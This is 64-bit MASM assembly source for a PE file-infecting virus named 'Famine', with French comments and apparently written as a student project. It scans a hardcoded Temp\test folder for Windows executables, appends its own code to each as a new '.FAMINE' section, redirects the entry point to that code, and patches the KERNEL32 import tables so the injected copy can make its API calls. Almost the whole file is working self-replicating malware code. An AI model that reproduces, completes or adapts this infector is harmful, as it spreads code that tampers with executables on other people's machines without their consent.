;-----------------------------------
;Descr  : My First 64-bit MASM program
;ml64 prog.asm /c
;golink /console /entry main prog.obj msvcrt.dll, or
;gcc -m64 prog.obj -o prog.exe (main/ret). This needs 64-bit GCC.
;-----------------------------------

includelib libcmt.lib
includelib kernel32.lib

extrn FindFirstFileA:proc
extrn FindNextFileA:proc
extrn ReadFile:proc
extrn CreateFileA:proc
extrn GetFileSize:proc
extrn SetFilePointer:proc
extrn WriteFile:proc
extrn GetProcessHeap:proc
extrn HeapAlloc:proc
extrn GetModuleFileNameA:proc
public label_avant_jump

.code

; rbp
; 224-232 : padding
; 32-224 : av[0] buffer
; 00-32 : shadow space
; rsp

label_debut:
 
debut_main:
main proc

		push rbp
		mov rbp, rsp

		push RAX
		push RBX
		push RCX
		push RDX
		push RSI
		push RDI
		push R8 
		push R9 
		push R10
		push R11
		push R12
		push R13
		push R14
		push R15

		sub rsp, 232
		or rsp, 0fh
		inc rsp
		sub rsp, 010h ; Alignement de la stack

		lea rcx, TMP_1
		lea rdx, [rsp + 32]
		mov r8, 192
		call infect_folder

		mov rdx, label_fin
		mov rcx, label_debut
		sub rdx, rcx

		add rsp, 232

		pop R15
		pop R14
		pop R13
		pop R12
		pop R11
		pop R10
		pop R9 
		pop R8 
		pop RDI
		pop RSI
		pop RDX
		pop RCX
		pop RBX
		pop RAX
		
		cmp BYTE ptr [MUST_EXIT], 1
		je stop


		mov rsp, rbp
		pop rbp
label_avant_jump::
		;db 0ffh, 25h, 00h, 00h, 00h, 00h
		jmp label_fin

stop:
		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
main endp
fin_main:

MUST_EXIT db 1
ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
SIGNATURE db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
SECTION_NAME db '.FAMINE',0
; rbp
; 80 - 88   : padding
; 72 - 80   : saved address of entry point
; 64 - 72   : saved r10
; 60 - 64	: size_of_main 
; 56 - 60	: Addresse virtuelle de notre code
; 52 - 56	; Padding (j'espere que magouin verra jamais ca)
; 48 - 52	: nbr of bytes read 
; 40 - 48	: HeapAlloc
; 32 - 40	: params
; 00 - 32	: shadow
; rsp

; rdi : Fin de la ft
; esi : VA de Famine dans le fichier distant
; r12 : handle
; r13 : fileSize
; r14 : taille de notre code
; r15 : Optianl Header address

handle_file proc ; int handle
	push rbp
	push rbx
	push rsi
	push rdi
	push r12
	push r13
	push r14
	push r15
	mov rbp, rsp
	sub rsp, 88

	mov r12, rcx ; r12 = handle

	; first parameter already in rcx
	mov rdx, 0 

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_get_file_size
	call proc_nt_get_file_size
	jmp end_get_file_size
not_nt_get_file_size:
		call GetFileSize
end_get_file_size:

	mov r13, rax ; r13 = taille du fichier = GetFileSize(handle, 0)
	mov rcx, label_fin
	mov rdx, label_debut
	sub rcx, rdx
	mov r14, rcx ; r14 = Taille de notre code
	add rcx, rax
	mov rdi, rcx ; rdi = taille a creer

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_get_process_heap
	call proc_nt_get_process_heap
	jmp end_get_process_heap
not_nt_get_process_heap:
		call GetProcessHeap
end_get_process_heap:

	mov rcx, rax ; rcx = GetProcessHeap()
	mov rdx, 0
	mov r8, rdi

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_heap_alloc
	call proc_nt_heap_alloc
	jmp end_heap_alloc
not_nt_heap_alloc:
		call HeapAlloc
end_heap_alloc:

	mov [rsp + 40], rax ; [rsp + 40] = HeapAlloc(heap, 0, taille du fichier)

	mov word ptr [rax], 5a4dh
	add rax, 2
	sub r13, 2 ; On a deja lu les deux premiers octets
	
	mov rcx, r12
	mov rdx, rax
	mov r8, r13
	lea r9, [rsp + 48]
	mov qword ptr [rsp + 32], 0

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_read_file
	call proc_nt_read_file
	jmp end_read_file
not_nt_read_file:
		call ReadFile ; ReadFile(handle, buffer, taille_du_fichier, &nombre_doctets_lus, 0)
end_read_file:


	cmp rax, rax ; if (read_file == 0) -> ret_failure
	jne ret_failure

	cmp r13d, dword ptr [rsp + 48] ; if (nombre_doctets_lus != taille_du_fichier) -> ret_failure
	jne ret_failure

	mov rcx, qword ptr [rsp + 40]
	mov rdx, r13
	call init_imports ; init_imports(buffer, taille_du_fichier)

	cmp rax, -1 ; si retour = -1 -> ret_failure
	je ret_failure

	mov rdx, 0

	mov rax, qword ptr [rsp + 40]
	add rax, 3Ch ; rax = &lfa_new
	mov edx, dword ptr [rax] ; rdx = lfa_new
	mov rax, qword ptr [rsp + 40]
	add rax, rdx ; rax = buffer + lfa_new = PE Header

	add rax, 6
	mov cx, word ptr [rax] ; cx = OldNumberOfSections
	inc word ptr [rax] ; NumberOfSections++

	add rax, 14

	mov rbx, 0
	mov bx, word ptr [rax]
	add rax, 4
	mov r15, rax
	add r15, 4 ;  ; r15 = &SizeOfCode

	add rax, rbx ; rax = premier_section_header
	
	mov rdx, 0
	mov dx, cx ; rdx = OldNumberOfSections

	mov rbx, rax ; temp

	mov rax, 40
	imul rdx ; rdx:rax = rdx * 40 = OldNumberOfSections * 40 = TailleDesSetions
	add rax, rbx ; rax = EndroitOuEcrireLaSectionFamine

	mov rbx, qword ptr [SECTION_NAME]
	mov  [rax], rbx ; on met le nom de la section

	add rax, 8
	mov dword ptr [rax], r14d ; on met la taille de Famine

	add rax, 4
	mov rbx, rax
	sub rbx, 40
	mov r8d, dword ptr [rbx]
	mov r9d, dword ptr [rbx - 4]
	add r8d, r9d
	or r8d, 0fffh
	inc r8d
	mov dword ptr [rsp + 56], r8d ; on sauvegarde la VA de Famine
	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle

	mov rsi, 0
	mov esi, r8d ; rsi = VA de famine

	add rax, 4
	mov rbx, r14
	or rbx, 0ffh
	inc rbx
	mov dword ptr [rax], ebx ; size of raw data

	add rax, 4
	add r13, 2
	mov dword ptr [rax], r13d ; Emplacement du code = taille du fichier

	add rax, 4
	mov qword ptr [rax], 0  ; PointerToReliocations and PointerToLineNumber

	add rax, 8
	mov dword ptr [rax], 0 ; NUmberOfRelocations and NumberOfLineNumber

	add rax, 4
	mov dword ptr [rax], 60000020h ; Characterisitcs

	mov rcx, [rsp + 40]
	add rcx, r13
	lea rdx, label_debut
	mov r8, r14
	call ft_memcpy	 ; on ecrit notre code a la fin du buffer ; ft_memcpy(buffer + tailleDuFichier, label_debut, tailleDeNotreCode)

	mov rcx, fin_main
	mov rdx, debut_main
	sub rcx, rdx
	mov dword ptr [rsp + 60], ecx ; On sauvegarde la taille du main

	mov rcx, [rsp + 40]
	add rcx, r13
	mov rbx, 0
	mov ebx, dword ptr [rsp + 60]
	add rcx, rbx ; rcx = buffer + tailleDuFichier + tailleDuMain = fin_du_main
	mov byte ptr [rcx], 0 ; on met MUST EXIT a 0

	mov rbx, r14
	or rbx, 0ffh
	inc rbx
	add dword ptr [r15], ebx ; SizeOfCode += tailleDeNotreCodeAlignee

	add r15, 12 ; r15 = &AddressOfEntryPoint
	mov rbx, 0
	mov ebx, dword ptr [r15] ; rbx = AddressOfEntryPoint
	inc rcx
	mov qword ptr [rcx], rbx ; On remplace l'entry point apres notre main (deadbeef) par l'entry point par defaut

	mov qword ptr [rsp + 72], rbx ; On sauvegarde AddressOfEntryPoint

	mov eax, dword ptr [rsp + 56] ; rax = VA de famine
	mov dword ptr [r15], eax ; AddressOfEntryPoint = VA de Famine

	add r15, 40 ; r15 = &SizeOfImage
	mov eax, dword ptr [rsp + 56]
	add eax, 01000h
	mov dword ptr [r15], eax ; Size of image += TailleDeFaine paddee a 0x1000 = 0x1000

	mov rax, qword ptr [rsp + 40] ; rax = addresse de heapalloc
	lea rbx, label_jump_find_first_file_a ; rbx = label jump dan notre memoire
	lea rcx, label_debut ; rcx = label debut dans notre memoire
	sub rbx, rcx ; rbx = offset des jumps dans notre memoire par rapport a notre debut de famine

	add rax, r13 ;
	add rax, rbx ; On va jusqu'au label jump create file de notre heapalloc
	add rax, 2 ; on avance jusqu'au parametre du jump dans heapalloc

	mov rbx, rax
	add rbx, 4 ; rbx = addresse_apres_le_premier_jump
	sub rbx, r13 ; rbx -= tailleDuFichier
	sub rbx, qword ptr [rsp + 40] ; rbx -= buffer ; (Ca devient un offset par rapport au debut du fichier)
	add ebx, esi ; ebx += Va de famine
	sub edi, ebx ; ebx -= VA de fin de la ft

	; en resume, rbx = OffsetApresLeJumpDansLeBuffer - buffer - tailleDuFichierOriginal + VA de famine - VAFinDeLaFt
					;	= VA du jump - VA de la ft

	mov rcx, 0

debut_boucle_ecriture_dans_jump:
	mov dword ptr [rax], edi
	add rax, 6
	add edi, 2
	inc rcx
	cmp rcx, 10
	jne debut_boucle_ecriture_dans_jump
	
	lea rdx, label_debut

	lea rbx, label_avant_jump
	add rbx, 5
	sub rbx, rdx
	add ebx, esi

	mov rcx, qword ptr [rsp + 72]
	sub ecx, ebx

	lea rax, label_avant_jump
	add rax, 1
	sub rax, rdx
	add rax, qword ptr [rsp + 40]
	add rax, r13

	mov dword ptr [rax], ecx

	mov rcx, r12
	mov rdx, 0
	mov r8, 0
	mov r9, 0

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_set_file_pointer
	call proc_nt_set_file_pointer
	jmp end_set_file_pointer
not_nt_set_file_pointer:
		call SetFilePointer
end_set_file_pointer:

	mov rcx, r12
	mov rdx, [rsp + 40]
	mov r8, r13
	add r8, r14
	lea r9, [rsp + 56]
	mov qword ptr [rsp + 32], 0

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_write_file
	call proc_nt_write_file
	jmp end_write_file
not_nt_write_file:
		call WriteFile
end_write_file:

	mov rcx, [rsp + 40]
	mov rdx, 0
	mov r8, r14
	and	r8, 0ffh
	xor r8, 0ffh
	inc r8
		mov rbx, r8
	call ft_memset

	mov rcx, r12
	mov rdx, [rsp + 40]
	mov r8, rbx
	lea r9, [rsp + 56]
	mov qword ptr [rsp + 32], 0

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_write_file_2
	call proc_nt_write_file
	jmp end_write_file_2
not_nt_write_file_2:
		call WriteFile
end_write_file_2:

ret_failure:

	mov rsp, rbp

	pop r15
	pop r14
	pop r13
	pop r12
	pop rdi
	pop rsi
	pop rbx

	pop rbp
	ret
handle_file endp

; rbp
; 70 - 72		: padding
; 66 - 70		: number_of_bytes_read
; 64 - 66		: Buffer
; 32 - 64		: params
; 00 - 32		: shadow
; rsp

open_file proc ; char *file_path - return fd or 0
	push rbp
	mov rbp, rsp
	push r12
	sub rsp, 72
	
	xor rax, rax

	; first parameter already in rcx
	mov rdx, 0C0000000h ; Desired Access
	mov r8, 0 ; Share permission
	mov r9, 0 ; NULL
	mov rax, 3
	mov [rsp + 32], rax ; Open only if exists
	mov rax, 80h
	mov [rsp + 36], rax ; flag normal
	mov rax, 0
	mov [rsp + 40], rax ; no attribute template

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_create_file
	call proc_nt_create_file
	jmp end_create_file
not_nt_create_file:
		call CreateFileA
end_create_file:
	
	mov r12, rax

	cmp rax, -1
	je ret_error


	mov rcx, r12
	lea rdx, [rsp + 64]
	mov r8, 2
	lea r9, [rsp + 66]
	mov rax, 0
	mov [rsp + 32], rax

	test BYTE ptr [MUST_EXIT], 1
	jne	not_nt_read_file
	call proc_nt_read_file
	jmp end_read_file
not_nt_read_file:
		call ReadFile
end_read_file:

	mov ax, word ptr [rsp + 64]
	cmp ax, 5a4dh
	je  ret_ok

ret_error:
	mov r12, -1
ret_ok:
	mov rax, r12
	pop r12
	mov rsp, rbp
	pop rbp
	ret
open_file endp

; rbp	
; 528-536	: Padding
; 400-528	: path + file name
; 40-400	: structure WIN32_FIND_DATA dirent
; 32-40		: folder_name
; 00-32		: shadow
; rsp

infect_folder proc ; parametres : char *folder_name, void *buffer, size of buffer
		push rbp
		push rsi
		mov rbp, rsp
		sub	rsp, 536

		mov [rsp + 32], rcx

		; First parameter already in rcx.
		lea rdx, [rsp + 40]

		test BYTE ptr [MUST_EXIT], 1
		jne	not_nt_find_first_file
		call proc_nt_find_first_file_a
		jmp end_find_first_file
not_nt_find_first_file:
		call FindFirstFileA
end_find_first_file:

		mov rsi, rax
loop_start:
		mov rcx, rsi
		lea rdx, [rsp + 40]

		test BYTE ptr [MUST_EXIT], 1
		jne	not_nt_find_next_file
		call proc_nt_find_next_file_a
		jmp end_find_next_file
not_nt_find_next_file:
		call FindNextFileA
end_find_next_file:

		cmp rax, 0
		je loop_end

		lea rcx, [rsp + 400]
		lea rdx, TMP_1_NAME ; /!\ : Le nom est en dur 
		mov r8, 128
		call ft_strncpy

		lea rcx, [rsp + 400]
		lea rdx, [rsp + 84]
		mov r8, 128
		call ft_strncat

		lea rcx, [rsp + 400]
		call open_file

		cmp rax, -1
		je loop_start

		mov rcx, rax 
		call handle_file ; handle_file(handle)

		jmp loop_start
loop_end:
		xor rax, rax
		mov rsp, rbp
		pop rsi
		pop rbp
		ret
infect_folder endp

ft_memset proc ; ft_memset(char *dst, char c, int n)
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx
	debut_boucle_ft_memset:
	cmp rax, r8
	je	fin_boucle_ft_memset
	mov byte ptr [rcx], dl
	inc rcx
	inc rax
	jmp debut_boucle_ft_memset
	fin_boucle_ft_memset:

	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_memset endp

ft_strncat proc ; char *strncat(char *dest, const char *src, size_t n);
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx
	debut_boucle_ft_strncat:
	cmp rax, r8
	je	fin_boucle_ft_memset
	cmp byte ptr [rcx], 0
	je fin_boucle_ft_memset

	inc rcx
	inc rax
	jmp debut_boucle_ft_strncat
	fin_boucle_ft_memset:
	debut_sec_boucle:
	cmp rax, r8
	je	fin_sec_boucle
	cmp byte ptr [rdx], 0
	je fin_sec_boucle
	mov r10B, [rdx]
	mov byte ptr [rcx], r10B
	inc rcx
	inc rdx
	inc rax
	jmp debut_sec_boucle
	fin_sec_boucle:
	mov byte ptr [rcx], 0
	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_strncat endp

ft_strncpy proc ; char *strncpy(char *dest, const char *src, size_t n);
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx

	debut_boucle_ft_strncpy:
	cmp rax, r8
	je	fin_boucle_strncpy
	cmp byte ptr [rdx], 0
	je fin_boucle_strncpy
	mov r10B, [rdx]
	mov byte ptr [rcx], r10B
	inc rcx
	inc rdx
	inc rax
	jmp debut_boucle_ft_strncpy
	fin_boucle_strncpy:
	mov byte ptr [rcx], 0
	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_strncpy endp

ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
	push rbp
	push r9
	push rcx
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx

	debut_boucle_ft_memcpy:
	cmp rax, r8
	je	fin_boucle_memcpy
	mov r11b, [rdx]
	mov byte ptr [rcx], r11b
	inc rcx
	inc rdx
	inc rax
	jmp debut_boucle_ft_memcpy
	fin_boucle_memcpy:
	mov rax, r9

	mov rsp, rbp
	pop rcx
	pop r9
	pop rbp
	ret
ft_memcpy endp

get_rip proc
	push rbp
	mov rbp, rsp

	mov rax, [rsp + 8]

	mov rsp, rbp
	pop rbp
	ret
get_rip endp

label_jump_find_first_file_a:
proc_nt_find_first_file_a proc
	jmp [qword ptr infect_folder]
proc_nt_find_first_file_a endp

label_jump_find_next_file_a:
proc_nt_find_next_file_a proc
	jmp [qword ptr infect_folder]
proc_nt_find_next_file_a endp

label_jump_read_file:
proc_nt_read_file proc
	jmp [qword ptr infect_folder]
proc_nt_read_file endp

label_jump_create_file:
proc_nt_create_file proc
	jmp [qword ptr infect_folder]
proc_nt_create_file endp

label_jump_get_file_size:
proc_nt_get_file_size proc
	jmp [qword ptr infect_folder]
proc_nt_get_file_size endp

label_jump_set_file_pointer:
proc_nt_set_file_pointer proc
	jmp [qword ptr infect_folder]
proc_nt_set_file_pointer endp

label_jump_write_file:
proc_nt_write_file proc
	jmp [qword ptr infect_folder]
proc_nt_write_file endp

label_jump_get_process_heap:
proc_nt_get_process_heap proc
	jmp [qword ptr infect_folder]
proc_nt_get_process_heap endp

label_jump_heap_alloc:
proc_nt_heap_alloc proc
	jmp [qword ptr infect_folder]
proc_nt_heap_alloc endp

label_get_module_file_name:
proc_nt_get_module_file_name proc
	jmp [qword ptr infect_folder]
proc_nt_get_module_file_name endp


ft_strequ proc ; int8_t strequ(const char *str1, const char *str2) ; return 1 if str1 == str2, return 0 else
	push rbp
	push r8
	mov rbp, rsp

	mov rax, 0
debut_boucle_ft_strequ:
	cmp byte ptr [rcx], 0
	je stop_ft_strequ
	cmp byte ptr [rdx], 0
	je stop_ft_strequ
	mov r8b, byte ptr [rcx] 
	cmp r8b, byte ptr [rdx]
	jne stop_ft_strequ_not_equal
	inc rcx
	inc rdx
	jmp debut_boucle_ft_strequ
stop_ft_strequ:
	mov r8b, byte ptr [rcx] 
	cmp r8b, byte ptr [rdx]
	jne stop_ft_strequ_not_equal
	mov rax, 1
stop_ft_strequ_not_equal:
	mov rsp, rbp
	pop r8
	pop rbp
	ret
ft_strequ endp

; rbp
; 80 - 88	: Unused
; 72 - 80	: FirstThunk
; 64 - 72   : Virtual Address de idata
; 56 - 64	: PointerToRawData de idata
; 48 - 56	: tmp storage for rax
; 40 - 48   : taille du fichier
; 32 - 40	: void *fichier
; 00 - 32	: shadow
; rsp

KERNEL_32_DLL_NAME db 'KERNEL32.dll',0h

FindFirstFileA_NAME db 7dh, 01h, 'FindFirstFileA',0h
FindNextFileA_NAME	db 8eh, 01h, 'FindNextFileA',0h
ReadFile_NAME		db 70h, 04h, 'ReadFile',0h
CreateFileA_NAME	db 0c2h,00h, 'CreateFileA',0h
GetFileSize_NAME	db 4eh, 02h, 'GetFileSize',0h
SetFilePointer_NAME	db 28h, 05h, 'SetFilePointer',0h
WriteFile_NAME		db 19h, 06h, 'WriteFile',0h
GetProcessHeap_NAME	db 0b7h,02h, 'GetProcessHeap',0h
HeapAlloc_NAME		db 4ah, 03h, 'HeapAlloc',0h
GetModuleFileNameA_NAME		db 75h, 02h, 'GetModuleFileNameA',0h

COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12, 21, 00

init_imports proc ; void init_imports(void *fichier)
	push rbp
	mov rbp, rsp
	sub rsp, 88

	mov qword ptr [rsp + 32], rcx ; on sauvegarde les parametres
	

	mov rax, rcx
	add rax, 3ch
	xor rdx, rdx
	mov edx, dword ptr [rax] ; o saute le header DOS
	mov rax, rcx
	add rax, rdx

	add rax, 4
	
	mov [rsp + 48], rax

	mov rcx, rax
	call search_section

	cmp rdx, 0
	jne apres
	mov rax, -1
	jmp fin_error

apres:
	mov [rsp + 56], rdx
	mov [rsp + 64], rcx
	
	mov rax, qword ptr [rsp + 48]

	add rax, 8ch ; Champ import directory rva
	mov rbx, 0
	mov ebx, dword ptr [rax] ; on met la rva d'import directory dans rbx
	sub rbx, rcx
	add rbx, rdx ; on transforme ca en file offset
	add rbx, qword ptr [rsp + 32] ; on ajoute l'addresse ou est charge le fichier
	mov rax, rbx ; on met ca dans rax

debut_boucle_init_imports_find_kernel32:
	add rax, 0ch ; on va sur le champ Name
	mov [rsp + 48], rax

	cmp dword ptr [rax], 0
	jne is_ok
	mov rax, -1
	jmp fin_error

is_ok:
	mov rbx, 0
	mov ebx, dword ptr [rax]
	sub rbx, qword ptr [rsp + 64]
	add rbx, qword ptr [rsp + 56]
	add rbx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
	lea rcx, KERNEL_32_DLL_NAME
	mov rdx, rbx
	
	call ft_strequ
	cmp rax, 1
	je fin_boucle_init_imports_find_kernel32
	mov rax, qword ptr [rsp + 48]
	add rax, 8
	jmp debut_boucle_init_imports_find_kernel32


fin_boucle_init_imports_find_kernel32:

	mov rax, qword ptr [rsp + 48]
	sub rax, 0ch; rax = ddresse de l'import

	mov rbx, 0
	mov ebx, dword ptr [rax]
	sub rbx, qword ptr [rsp + 64]
	add rbx, qword ptr [rsp + 56]
	add rbx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire

	xor rcx, rcx
	mov ecx, dword ptr [rbx]
	sub rcx, qword ptr [rsp + 64]
	add rcx, qword ptr [rsp + 56]
	add rcx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire

	add rax, 10h; rax  = addresse de la rva de
	mov eax, dword ptr [rax]
	sub rax, qword ptr [rsp + 64]
	add rax, qword ptr [rsp + 56]
	add rax, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
	
	mov qword ptr [rsp + 72], rax ; on sauvegarde l'adresse de la ft

grande_boucle_init_imports:
	add rcx, 2
	cmp byte ptr [rcx], 0
	je grande_boucle_init_imports_fin
	inc rcx
petite_boucle_init_imports:
	inc rcx
	cmp byte ptr [rcx - 1], 0
	je grande_boucle_init_imports
	jmp petite_boucle_init_imports

grande_boucle_init_imports_fin:


	; Destination deja dans rcx la premiere fois
	lea rdx, FindFirstFileA_NAME
	mov r8, 151
	call ft_memcpy

debut_boucle_oft_trouver_fin: ; RBX doit etre l'adresse de la premiere entree de l'oft
	cmp dword ptr [rbx], 0
	je fin_boucle_oft_trouver_fin
	add rbx, 8
	jmp debut_boucle_oft_trouver_fin
fin_boucle_oft_trouver_fin:

	mov rax, qword ptr [rsp + 72]
debut_boucle_ft_trouver_fin: ; RAX doit etre l'adresse de la premiere entree de la ft
	cmp dword ptr [rax], 0
	je fin_boucle_ft_trouver_fin
	add rax, 8
	jmp debut_boucle_ft_trouver_fin
fin_boucle_ft_trouver_fin:

	lea r8, COUNT

	add rcx, qword ptr [rsp + 64]
	sub rcx, qword ptr [rsp + 56]
	sub rcx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire

	
	; rbx = fin oft
	; rax = fin ft
	; rcx = fin tableau_noms
	; r8 = count
	
debut_boucle_remplir_la_ft:
	mov qword ptr [rbx], rcx
	mov qword ptr [rax], rcx
	add rax, 8
	add rbx, 8

	xor r9, r9
	mov r9b, byte ptr [r8]
	add rcx, r9 ; rcx += *count

	inc r8 ; count++
	cmp byte ptr [r8], 0
	je fin_boucle_remplir_la_ft
	jmp debut_boucle_remplir_la_ft
fin_boucle_remplir_la_ft:

	sub rax, 80


	add rax, qword ptr [rsp + 64]
	sub rax, qword ptr [rsp + 56]
	sub rax, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
	mov rdi, rax

fin_error:

	mov rsp, rbp
	pop rbp
	ret

init_imports endp


; rbp

; 16 - 24 -> nombre de sections
; 08 - 16 -> return rcx
; 00 - 08 -> return rdx

; rsp

search_section proc
	push rbp
	push rbx
	push r15
	mov rbp, rsp
	sub rsp, 16
	mov rbx, 0

	mov dword ptr [rsp], 0
	mov dword ptr [rsp + 8], 0
	
	add rcx, 2
	mov bx, word ptr [rcx]
	mov word ptr [rsp + 16], bx

	add	rcx, 8ah
	mov rbx, 0
	mov ebx, dword ptr [rcx]

	sub rcx, 8ch
	mov rax, rcx
	add rax, 10h
	xor rdx, rdx
	mov dx, word ptr [rax]
	add rax, rdx
	add rax, 4

debut_boucle:
	mov edx, dword ptr [rax + 8]
	mov ecx, dword ptr [rax + 12] ; ecx = VirtualAddress = debut section
	add edx, ecx; edx = VIrtualAddress + VirtualSize = fin section

	mov r15, qword ptr [SECTION_NAME]
	cmp qword ptr [rax], r15
	jne cpaca
	mov dword ptr [rsp], 0
	mov dword ptr [rsp + 8], 0
	jmp ret_func


cpaca:
	cmp ebx, ecx
	jl fin_boucle
	cmp ebx, edx
	jg fin_boucle

	mov dword ptr [rsp + 8], ecx
	mov edx, dword ptr [rax + 20]
	mov dword ptr [rsp], edx
;	jmp ret_func
fin_boucle:
	add rax, 28h

	mov r15w, word ptr [rsp + 16]
	dec r15w
	cmp r15w, 0
	je ret_func
	mov word ptr [rsp + 16], r15w

	jmp debut_boucle 

ret_func:
	mov ecx, dword ptr [rsp + 8]
	mov edx, dword ptr [rsp]

	mov rsp, rbp
	pop r15
	pop rbx
	pop rbp
	ret
search_section endp

get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichier). Retourne VirtualAddress dans rcx, et PointerToRawData dans rdx
	push rbp
	push rbx
	mov rbp, rsp
	sub rsp, 32

	call search_section
	; sections = file header + sizeof(file_header) + SizeOfOptionalHeader
	mov rax, rcx
	add rax, 10h
	mov rbx, 0
	mov bx, word ptr [rax]
	add rax, rbx
	add rax, 4
debut_boucle_get_idata:
	mov rbx, 0
	mov ebx, 00006174h
	rol rbx, 32
	mov rdx, rbx
	mov ebx, 6164692eh
	or	rbx, rdx
	cmp qword ptr [rax], rbx
	je	fin_boucle_get_idata
	add rax, 28h
	jmp	debut_boucle_get_idata
fin_boucle_get_idata:
	mov ecx, dword ptr [rax + 0ch]
	mov edx, dword ptr [rax + 014h]
	mov rsp, rbp
	pop rbx
	pop rbp
	ret
get_idata_values  endp

label_fin:
end